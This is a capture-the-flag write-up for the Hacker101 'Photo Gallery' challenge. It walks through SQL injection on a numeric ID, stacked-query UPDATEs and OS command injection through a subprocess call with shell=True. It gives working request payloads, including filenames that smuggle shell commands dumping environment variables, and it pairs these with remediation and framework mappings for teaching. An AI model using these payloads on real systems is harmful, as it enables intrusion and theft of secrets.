# Photo Gallery: Writeup (3/3)

**Difficulty:** Moderate  
**Category:** Web: SQL Injection, File Read, Stacked Queries, RCE  
**Flags:** 3/3 (complete)  
**Platform:** Hacker101 CTF

---

## Challenge Overview

**Context:** Photo gallery built in Python/Flask with SQLite. Displays three cat images, allows viewing each via `/fetch?id=N`, and shows disk space usage on the home page.

**What you face:** A numeric ID parameter that looks innocent, an SQLite database with stored filenames, and a disk space calculation function that calls `subprocess` with `shell=True` using data from the database.

**Vulnerabilities exploited:**
- SQL Injection (CWE-89) on a numeric parameter: UNION SELECT with `1.1` to return zero real rows
- Stacked Queries (`;UPDATE ... COMMIT`) to modify persistent state
- Command Injection (CWE-78) via `subprocess.check_output(..., shell=True)` with a controlled filename
- Arbitrary File Read via UNION SELECT injecting paths as filenames

**What you learn:**
- Numeric IDs are just as injectable as strings: always parameterize
- UNION SELECT with a decimal (`1.1`) returns zero rows from the original query, exposing only the UNION
- Stacked queries allow modifying the database via SELECT (not just reading)
- `subprocess` with `shell=True` and unsanitized data = critical command injection
- Environment variables (`env`) frequently contain flags in container-based CTFs

---

## Objective

Exploit SQL injection in the `id` parameter of the `/fetch` endpoint to read internal files, exfiltrate the database table, and execute commands on the system via filename injection into a `subprocess` call with `shell=True`.

---

## Database Structure (extracted via SQLi)

| id | title            | parent | filename           |
|----|------------------|--------|--------------------|
| 1  | Utterly adorable | 1      | files/adorable.jpg |
| 2  | Purrfect         | 1      | files/purrfect.jpg |
| 3  | Invisible        | 1      | FLAG1              |

---

## Flag 0: Arbitrary File Read via Decimal SQLi

**Vulnerability:** The `id` parameter in `/fetch?id=N` is interpolated directly into the SQL query.

### Step 1: Detect the behavior

Accessing `/fetch?id=1` returns the normal image. Trying `/fetch?id=3` returns an error or blank (filename = `FLAG1`).

### Step 2: Exploit with UNION SELECT

```
GET /fetch?id=1.1 UNION SELECT 'files/adorable.jpg'--
```

The decimal in `1.1` results in zero rows from the original query, and the `UNION SELECT` injects the desired filename.

### Step 3: Read the flag directly

Photo ID 3 has `filename = FLAG1`. This value is the content of flag 0, read from the database:

```
GET /fetch?id=1.1 UNION SELECT 'FLAG1'--
```

Returns the "image" whose content is flag 0.

---

## Flag 1: SQL Injection + Source Code Read

**Vulnerability:** UNION SELECT allows injecting any filename, including system paths.

### Step 1: Inject the source code path

```
GET /fetch?id=1.1 UNION SELECT 'main.py'--
```

The server serves the contents of `main.py` as if it were an image. The full application source code appears in the response.

Flag 1 is embedded in the source code (as a string or comment).

---

## Flag 2: Stacked Queries + RCE via subprocess (shell=True)

**Vulnerability:** The disk space calculation function uses `subprocess.check_output` with `shell=True` and interpolates the `filename` directly:

```python
rep += '<i>Space used: ' + subprocess.check_output(
    'du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns),
    shell=True, stderr=subprocess.STDOUT
).strip().rsplit('\n', 1)[-1] + '</i>'
```

The filename is concatenated into the shell command. By injecting `* || <command>` as a filename, the server executes the command.

### Step 1: Update photo 3's filename via stacked query

```
GET /fetch?id=1;UPDATE photos SET filename='* || env > recon.txt' WHERE id=3;COMMIT;--
```

This updates photo 3's filename to `* || env > recon.txt`.

### Step 2: Trigger execution on the home page

Access the application root:

```
GET /
```

The page calculates disk space with `du -ch files/adorable.jpg files/purrfect.jpg * || env > recon.txt`, executing `env` and writing the output to `recon.txt`.

### Step 3: Read the output file via UNION SELECT

```
GET /fetch?id=1.1 UNION SELECT 'recon.txt'--
```

The response contains all environment variables, including the `FLAGS` variable with all the flags.

### Alternative: run ls to verify structure

```
GET /fetch?id=1;UPDATE photos SET filename='* || ls > ls.txt' WHERE id=3;COMMIT;--
```

Then: `GET /fetch?id=1.1 UNION SELECT 'ls.txt'--`

---

## Attack Summary

```
FLAG 0: /fetch?id=1.1 UNION SELECT 'FLAG1'-- → flag content stored in database
FLAG 1: /fetch?id=1.1 UNION SELECT 'main.py'-- → source code with embedded flag
FLAG 2: stacked UPDATE → filename='* || env > recon.txt' → GET / → UNION SELECT 'recon.txt'--
```

---

## Lessons Learned

1. **SQL injection on numeric parameters**: always parameterize queries, even for IDs
2. **UNION SELECT with decimal** (`1.1`) returns zero real rows, leaving only the UNION result
3. **Stacked queries** allow UPDATE/INSERT via SQLi, modifying persistent state
4. **subprocess with shell=True and unsanitized data** = critical command injection
5. **User-controlled filenames** must never be passed to shell commands
6. **Environment variables** frequently contain flags and secrets in lab/container environments

---

## MITRE ATT&CK Mapping

| Tactic | Technique | TTP-ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Collection | Data from Information Repositories | T1213 |
| Discovery | File and Directory Discovery | T1083 |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Persistence | Server Software Component: SQL Stored Procedures | T1505.001 |

## Remediation and Containment

### Technical Fixes

1. Parameterize all SQL queries, including numeric ID parameters
2. Disable stacked queries in the database driver configuration when not needed
3. Replace `subprocess.Popen(shell=True)` with `subprocess.run(["cmd", arg])` to prevent command injection
4. Sanitize user-controlled filenames before any filesystem or shell operation
5. Never store secrets in environment variables accessible to web processes; use a dedicated secrets manager

### OWASP Top 10 2021

- **A03:2021 Injection**: SQL injection via numeric parameter and OS command injection via unsanitized filename
- **A05:2021 Security Misconfiguration**: stacked queries enabled, debug secrets in environment variables

### MITRE D3FEND Countermeasures

- **D3-IPCF (Input/Payload Content Filtering)**: validate and parameterize all inputs
- **D3-PSEP (Process Segment Execution Prevention)**: prevent arbitrary shell execution from web contexts
- **D3-EAL (Execution Allow Listing)**: restrict which commands can be invoked by the web application

### NIST CSF 2.0

- **Protect (PR.DS-1)**: data-at-rest is protected
- **Protect (PR.DS-2)**: data-in-transit is protected
- **Detect (DE.CM-1)**: the network is monitored to detect potential cybersecurity events
- **Respond (RS.AN-3)**: forensics are performed

### NIST SP 800-53 Rev. 5

- **SI-10 Information Input Validation**: check the validity of information inputs
- **SC-39 Process Isolation**: maintain a separate execution domain for each executing process
- **CM-7 Least Functionality**: configure the system to provide only essential capabilities
- **AU-6 Audit Record Review**: review and analyze information system audit records

---

Thanks guys!! (❍ᴥ❍ʋ)

---

SQL injection into stacked queries that pivot to OS command injection through `shell=True` is a devastating chain. One unparameterized ID field, and you go from reading database rows to dumping environment variables with full RCE.

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
